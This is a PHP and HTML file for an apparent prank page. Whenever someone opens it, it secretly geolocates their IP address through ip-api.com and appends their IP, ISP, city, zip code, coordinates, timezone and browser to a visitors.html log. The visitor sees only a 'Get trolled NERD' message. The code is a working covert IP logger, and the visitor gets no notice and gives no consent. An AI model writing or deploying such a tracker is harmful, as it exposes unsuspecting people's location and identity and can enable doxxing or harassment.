<?php
$ch = curl_init();
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$ip = $_SERVER['REMOTE_ADDR'];
$browser = $_SERVER['HTTP_USER_AGENT'];
curl_setopt($ch, CURLOPT_URL, "http://ip-api.com/json/$ip");
$result = curl_exec($ch);
curl_close($ch);

$obj = json_decode($result);
$city = $obj->city;
$as = $obj->as;
$country = $obj->country;
$countryCode = $obj->countryCode;
$isp = $obj->isp;
$lat = $obj->lat;
$lon = $obj->lon;
$org = $obj->org;
$region = $obj->region;
$regionName = $obj->regionName;
$timezone = $obj->timezone;
$zip = $obj->zip;
$dateTime = date('Y/m/d G:i:s');
$file = "visitors.html";
$file = fopen($file, "a");
$data = "\e[0;31mUser IP :\e[1;37m $ip \n\n\e[0;31mORG :\e[1;37m $org\n\n\e[0;31mISP :\e[1;37m $isp\n\n\e[0;31mCountry :\e[1;37m $country - $countryCode\n\n\e[0;31mRegion :\e[1;37m $regionName($region)\n\n\e[0;31mCity :\e[1;37m $city\n\n\e[0;31mTimezone :\e[1;37m $timezone\n\n\e[0;31mZip Code :\e[1;37m $zip\n\n\e[0;31mCoordinates :\e[1;37m $lat, $lon\n\n\e[0;31mTime :\e[1;37m $dateTime\n\n\e[0;31mBrowser :\e[1;37m $browser\n";
$lines = "\n--------------------------\n";
$line = "--------------------------";
$text = "\n      Most Recent Log: ";
fwrite($file, $text);
fwrite($file, $lines);
fwrite($file, $data);
fclose($file);
fwrite($file, $line);
?>
<?php
$profpic = "troll.gif";
?>

<html>
<head>
<style type="text/css">

body {
background-image: url('<?php echo $profpic;?>');
}
</style>

<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>its just a prank</title>
<br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><center><h1>Get trolled NERD</h1>
</head>
<body>
</body>
</html>
